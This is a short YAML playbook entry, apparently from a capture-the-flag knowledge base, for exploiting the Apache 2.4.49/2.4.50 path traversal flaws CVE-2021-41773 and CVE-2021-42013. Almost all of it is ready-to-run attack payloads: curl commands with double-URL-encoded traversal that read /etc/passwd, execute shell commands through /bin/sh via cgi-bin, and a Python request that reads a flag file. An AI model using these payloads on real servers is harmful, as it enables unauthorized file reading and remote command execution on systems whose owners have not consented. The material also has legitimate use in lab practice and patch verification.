name: apache_cve_2021_42013_path_traversal_rce
category: web
tags: [cve, apache, path_traversal, rce, cve-2021-42013]
indicators:
  - "Apache 2.4.49 or 2.4.50"
  - "mod_cgi or mod_cgid enabled"
  - "cgi-bin directory configured with Require all granted"

tricks:
  - name: "Step 1: Identify vulnerable version"
    when: "Information gathering"
    how: "Check Apache version in Server header"
    payload: |
      curl -I http://TARGET/ | grep Server
      # Apache 2.4.49: CVE-2021-41773 (use .%2e)
      # Apache 2.4.50: CVE-2021-42013 (use .%%32%65)

  - name: "Step 2: Path traversal to read files"
    when: "Only need to read files"
    how: "Double URL encoding bypasses path normalization"
    payload: |
      curl http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
      # .%%32%65 -> .%2e -> .

  - name: "Step 3: RCE via cgi-bin"
    when: "Need command execution"
    how: "Path traversal to /bin/sh, POST body as shell command"
    payload: |
      curl http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh -d "echo; id"

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "Path traversal + RCE to read flag"
    payload: |
      path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
      cmd = "echo; cat /FLAG.txt"
      resp = requests.post(f"{TARGET}{path}", data=cmd)
